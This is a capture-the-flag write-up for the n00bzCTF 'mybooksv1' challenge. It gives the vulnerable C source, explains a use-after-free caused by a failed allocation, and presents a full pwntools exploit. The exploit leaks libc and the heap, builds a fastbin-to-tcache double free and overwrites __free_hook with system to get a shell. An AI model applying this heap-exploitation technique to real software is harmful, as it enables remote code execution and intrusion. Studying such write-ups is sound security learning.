# n00bzCTF mybooksv1 writeup

For this challenge we receive a binary and the source code of said binary:

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>

#define N_BOOK 16

typedef struct Book {
	uint32_t num_page;
	char title[24];
	char *desc;
} Book;

Book* books[N_BOOK];

void read_strline(char* buf, unsigned int size) {
	int n = read(0, buf, size);
	if(n < 0) {
		fprintf(stderr, "read error\n");
		exit(1);
	}
	buf[n-1] = '\0';
}

unsigned long int read_int() {
	char buf[24];
	memset(buf, 0, sizeof(buf));
	read_strline(buf, 23);
	return strtoul(buf, NULL, 10);
}

uint16_t get_idx_book(void) {
	uint16_t idx;
	printf("idx book: ");
	idx = read_int();
	if(idx >= N_BOOK) {
		fprintf(stderr, "Invalid book index\n");
		exit(1);
	}
	return idx;
}

int menu() {
	printf("*** Books v1.0 ***\n");
	printf("[1] Create book\n");
	printf("[2] Edit book\n");
	printf("[3] Print book\n");
	printf("[4] Delete book\n");
	printf("[5] Exit\n");
	printf("> ");
	return (int)read_int();
}

int main(void) {
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
	int choice = 0;
	char buf[40] = {0};
	uint16_t idx = 0;
	size_t desc_len;
	while(1) {
		choice = menu();
		switch(choice) {
			case 1:
				idx = get_idx_book();
				if(books[idx]) {
					printf("Book already exists\n");
					break;
				}

				books[idx] = malloc(sizeof(Book));
				printf("title: ");
				read_strline(books[idx]->title, 24);
				printf("num page: ");
				books[idx]->num_page = read_int();
				printf("desc len: ");
				desc_len = read_int();
				char* desc = malloc(desc_len);
				if(!desc) {
					fprintf(stderr, "malloc error\n");
					break;
				}
				printf("desc: ");
				read_strline(desc, desc_len);
				books[idx]->desc = desc;
				break;
			case 2:
				idx = get_idx_book();
				if(!books[idx]) {
					printf("Book not exists\n");
					break;
				}
				Book* book = books[idx];

				printf("title: ");
				read_strline(book->title, 24);

				printf("num page: ");
				book->num_page = read_int();

				printf("desc len: ");
				desc_len = read_int();
				free(book->desc);
				desc = malloc(desc_len);

				printf("desc: ");
				read_strline(desc, desc_len);
				book->desc = desc;
				break;
			case 3:
				idx = get_idx_book();
				if(!books[idx]) {
					printf("Book not exists\n");
					break;
				}
				printf("num page : %d\n", books[idx]->num_page);
				printf("title : %s\n", books[idx]->title);
				printf("description : %s\n", books[idx]->desc);
				break;
			case 4:
				idx = get_idx_book();
				if(!books[idx]) {
					printf("Book not exists\n");
					break;
				}
				free(books[idx]->desc);
				free(books[idx]);
				books[idx] = NULL;
				break;
			case 5:
				goto done;
				break;
			default:
				printf("Not implemented\n");
				break;
		}
		printf("Done\n");
	}
done:
	printf("Bye!\n");
}
```
## The bug

The bug lies in a combination of case 1 and case 2:

1. Alloc a book with a desc_len of 0x28
2. Edit that book to have a desc_len of 0x48. We now have a free ptr we control of size 0x28 (the same as the book size)
3. Allocate another book, but when it asks for desc_len provide -1 as the length. The desc allocation will fail, but the data left over from step 1 is still inside of it

You can now control the data inside of the 2nd book allocated via, the data of desc in your first allocation, meaning you can input an arbitrary ptr. This is an extremely strong primitive.

## Exploitation

I created helper functions to easily be able to alloc, free and edit books. These were my helper functions:

```python
def create_book(idx,title,num_pages,desc,desc_len):
    io.recvuntil(b'>')
    io.sendline(b'1')
    io.recvuntil(b'idx book:')
    io.sendline(f"{idx}".encode())
    io.recvuntil(b'title:')
    io.send(title)
    io.recvuntil(b'num page:')
    io.sendline(f"{num_pages}".encode())
    io.recvuntil(b"desc len:")
    io.sendline(f"{desc_len}".encode())
    io.recvuntil(b'desc:')
    io.send(desc)

def create_invalid_book(idx,title,num_pages,desc_len):
    io.recvuntil(b'>')
    io.sendline(b'1')
    io.recvuntil(b'idx book:')
    io.sendline(f"{idx}".encode())
    io.recvuntil(b'title:')
    io.send(title)
    io.recvuntil(b'num page:')
    io.sendline(f"{num_pages}".encode())
    io.recvuntil(b"desc len:")
    io.sendline(f"{desc_len}".encode())


def edit_book(idx,title,num_pages,desc,desc_len):
    io.recvuntil(b'>')
    io.sendline(b'2')
    io.recvuntil(b'idx book:')
    io.sendline(f"{idx}".encode())
    io.recvuntil(b'title:')
    io.send(title)
    io.recvuntil(b'num page:')
    io.sendline(f"{num_pages}".encode())
    io.recvuntil(b"desc len:")
    io.sendline(f"{desc_len}".encode())
    io.recvuntil(b'desc:')
    io.send(desc)

def delete_book(idx):
    io.recvuntil(b'>')
    io.sendline(b'4')
    io.recvuntil(b'idx book:')
    io.sendline(f"{idx}".encode())

def leak(idx):
    io.recvuntil(b'>')
    io.sendline(b'3')
    io.recvuntil(b'idx book:')
    io.sendline(f"{idx}".encode())
    io.recvuntil(b'description : ')
    return io.recvline()
```


First we need to leak libc and the heap. We can do this by filling up Tcache bins with a size of more than 0x90. Once tcache bins are filled up, and we free a chunk of that size, it will automatically be put into the unsorted bin. The unsorted bin contains a ptr to libc.

Using our previously mentioned primitive we:

1. Allocate 8 books with a desc_len of 0x98
2. Free them all
3. Alloc 7 books again and one invalid book.
4. The invalid book now contains a ptr to the last freed desc chunk, which is our ptr to libc.

During this, we can also leak heap in the same manner:

Libc leak:
```python
for i in range(0,8):
    create_book(i,b'abcd',20,chr(0x41+i).encode()*0x98,0x98)

for i in range(0,8):
    if i == 3:
        continue
    delete_book(i)
delete_book(3)

for i in range(0,7):
    create_book(i,b'abcd',20,b'\n',0x98)
create_invalid_book(14,b'abcd',20,-1)

libcleak = u64(leak(14)[:-1].ljust(8,b'\x00'))
```

Heap leak
```python
for i in range(0,6):
    delete_book(i)
delete_book(6)
create_invalid_book(15,b'abcd',20,-1)

heapleak = u64(leak(15)[:-1].ljust(8,b'\x00'))
```

Once we have this information we can force a double free. However since this is libc 2.31, Tcache bins are pretty hardened against double frees.

But fastbins aren't.

We can fill up tcache bins, then force the next frees to be in fastbins. Here we create our double free.

Once the double free has been created, we start allocating back the chunks, to remove the bins.

This causes TCache to notice that there a fastbin chunks, which fit inside of it now, and it moves the fastbin ptrs directly into the tcache bin without any checks.

We now have a double free inside of the tcache bins.

In practice this requires us to:

1. Alloc 7 books with desc_len of 0x68
2. Create a book with a desc_len of 0x28 and fill it with ptrs to the next chunk that will be allocated
3. Edit the book and set the desc_len to 0x68 (this is the chunk we point to in step 2)
4. Create an invalid book which causes us to use the stuff we prepared in step 2.
5. Create another random book of size 0x68. This one is just so we don't get caught fastbin duping
6. Delete the 7 first books allocated
7. Edit the invalid book and set it to another size (in this case I set it to 0x88). This causes the desc we allocated in step 3 to be freed.
8. Free the book from step 5 and then the book from step 2.
9. You have now caused a double free!   

In practice the code looks like this:
```python
for i in range(0,7):
    create_book(i,b'abcd',20,b'Q'*0x68,0x68)



create_book(7,b'fastbin1',20,p64(heapbase+0xc20)*8,0x28)
edit_book(7,b'fastbin1',20,b'L'*0x68,0x68)
create_invalid_book(13,b'abcd',20,-1)
# edit_book(8,b'abcd',20,b'Q',0x88)

create_book(9,b'fastbin2',20,b'V'*0x68,0x68)


for i in range(0,7):
    delete_book(i)

edit_book(13,b'abcd',20,b'/bin/sh\x00',0x88)

delete_book(9)
delete_book(7)
```

I put /bin/sh inside of book 13 because we will be using that chunk later.

Now that we have a double free in fastbins, we need to allocate back the tcache bins, so we can use it inside of tcache instead.

Why? Fastbins have a check for whether or not it's allocated correctly inside a valid chunk, however tcache bins have no such check and will just create the chunk metadata where it's allocated.

This means that a double free in tcache bins is way more powerful than a double free in fast bins, as double free in tcache bins is just arbitrary write.

Creating 7 books, will cause the fastbin dup to be moved to the tcache.

We can then put ptrs of where we want to alloc next inside of any chunk allocated, so at some point when we allocate, we will allocate to the address we control.

I just personally decided to put it inside of all of them to be sure.

I decided to write to __free_hook as in free hook we can control RDI as well as RIP

```python
for i in range(0,10):
    create_book(i,b'abcd',20,p64(free_hook)*13,0x68)
```

Once that is done we allocate system and free a book with /bin/sh in it, to call system:


```python
create_book(12,b'abcd',20,p64(system)*13,0x68)

io.recvuntil(b'>')
io.sendline(b'2')
io.recvuntil(b'idx book:')
io.sendline(f"13".encode())
io.recvuntil(b'title:')
io.send(b'abcd')
io.recvuntil(b'num page:')
io.sendline(f"20".encode())
io.recvuntil(b'desc len:')
io.sendline(b'5')


io.interactive()
```

Which gives us the flag:

```n00bz{miss_error_handling_turns_into_RCE?}```

## The libc debacle
Libc on the remote instance was wrong. I noticed this pretty quickly after being able to pop a shell locally, but when run on remote it would just keep executing the program normally.

This caused me to write to the admins, who weren't able to provide me with a sha256sum of the libc on remote, but they were able to provide me with which docker image was used to spawn the challenge.

I duplicated this docker image locally, and grabbed the libc, but alas. The exploit still did not work on remote, even after fixing offsets with this libc.

So what can we do?

Well inside of every libc is a string, which signifies what full release version it is. Using this we can leak this string inside of libc and then download the correct one and modify our exploit.

The original libc used was actually `GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31`

I used the following code to leak that string on the remote:

```python
create_book(0,b'abcd',20,p64(libcbase+0x001b7b80)*5,0x28)
edit_book(0,b'abcd',20,b'F'*0x58,0x58)
create_invalid_book(1,b'lol',20,-1)
print(leak(1))
```

Then downloaded the correct libc version and fixed offsets.

## Full exploit code:

```python
from pwn import *

context.terminal = ["konsole","-e"]

#1 edit book
#2 print book
#3 delete book
#4 create book's 2nd malloc
gdbscript = """
b *$rebase(0x00001695)
b *$rebase(0x000017a8)
b *$rebase(0x00001875)
b *$rebase(0x1615)
c
c 8
c 8
c 8
c
c 7
c
c
c 8
c
c
c
"""

#io = gdb.debug("./chall",gdbscript=gdbscript)
#io = process("./chall")
io = remote("167.99.154.216",4441) #167.99.154.216 4441 

def create_book(idx,title,num_pages,desc,desc_len):
    io.recvuntil(b'>')
    io.sendline(b'1')
    io.recvuntil(b'idx book:')
    io.sendline(f"{idx}".encode())
    io.recvuntil(b'title:')
    io.send(title)
    io.recvuntil(b'num page:')
    io.sendline(f"{num_pages}".encode())
    io.recvuntil(b"desc len:")
    io.sendline(f"{desc_len}".encode())
    io.recvuntil(b'desc:')
    io.send(desc)

def create_invalid_book(idx,title,num_pages,desc_len):
    io.recvuntil(b'>')
    io.sendline(b'1')
    io.recvuntil(b'idx book:')
    io.sendline(f"{idx}".encode())
    io.recvuntil(b'title:')
    io.send(title)
    io.recvuntil(b'num page:')
    io.sendline(f"{num_pages}".encode())
    io.recvuntil(b"desc len:")
    io.sendline(f"{desc_len}".encode())


def edit_book(idx,title,num_pages,desc,desc_len):
    io.recvuntil(b'>')
    io.sendline(b'2')
    io.recvuntil(b'idx book:')
    io.sendline(f"{idx}".encode())
    io.recvuntil(b'title:')
    io.send(title)
    io.recvuntil(b'num page:')
    io.sendline(f"{num_pages}".encode())
    io.recvuntil(b"desc len:")
    io.sendline(f"{desc_len}".encode())
    io.recvuntil(b'desc:')
    io.send(desc)

def delete_book(idx):
    io.recvuntil(b'>')
    io.sendline(b'4')
    io.recvuntil(b'idx book:')
    io.sendline(f"{idx}".encode())

def leak(idx):
    io.recvuntil(b'>')
    io.sendline(b'3')
    io.recvuntil(b'idx book:')
    io.sendline(f"{idx}".encode())
    io.recvuntil(b'description : ')
    return io.recvline()

#Leak libc by creating an unsorted bin and printing the address with a UAF
for i in range(0,8):
    create_book(i,b'abcd',20,chr(0x41+i).encode()*0x98,0x98)

for i in range(0,8):
    if i == 3:
        continue
    delete_book(i)
delete_book(3)

for i in range(0,7):
    create_book(i,b'abcd',20,b'\n',0x98)
create_invalid_book(14,b'abcd',20,-1)

libcleak = u64(leak(14)[:-1].ljust(8,b'\x00'))
libcbase = libcleak - 0x1ebbe0-0x1000

#malloc_hook = libcbase+0x1ebb45
free_hook = libcbase+0x1eee48

for i in range(0,6):
    delete_book(i)
delete_book(6)
create_invalid_book(15,b'abcd',20,-1)
heapleak = u64(leak(15)[:-1].ljust(8,b'\x00'))
heapbase = heapleak-0x3a0
system = libcbase+0x52290

log.info(f"LIBC BASE: {hex(libcbase)}")
log.info(f"HEAP BASE: {hex(heapbase)}")
log.info(f"system: {hex(system)}")

# create_book(0,b'abcd',20,p64(libcbase+0x001b7b80)*5,0x28)
# edit_book(0,b'abcd',20,b'F'*0x58,0x58)
# create_invalid_book(1,b'lol',20,-1)
# print(leak(1))


for i in range(0,7):
    create_book(i,b'abcd',20,b'Q'*0x68,0x68)



create_book(7,b'fastbin1',20,p64(heapbase+0xc20)*8,0x28)
edit_book(7,b'fastbin1',20,b'L'*0x68,0x68)
create_invalid_book(13,b'abcd',20,-1)
# edit_book(8,b'abcd',20,b'Q',0x88)

create_book(9,b'fastbin2',20,b'V'*0x68,0x68)


for i in range(0,7):
    delete_book(i)

edit_book(13,b'abcd',20,b'/bin/sh\x00',0x88)

delete_book(9)
delete_book(7)

for i in range(0,10):
    create_book(i,b'abcd',20,p64(free_hook)*13,0x68)



create_book(12,b'abcd',20,p64(system)*13,0x68)

io.recvuntil(b'>')
io.sendline(b'2')
io.recvuntil(b'idx book:')
io.sendline(f"13".encode())
io.recvuntil(b'title:')
io.send(b'abcd')
io.recvuntil(b'num page:')
io.sendline(f"20".encode())
io.recvuntil(b'desc len:')
io.sendline(b'5')


io.interactive()
``` 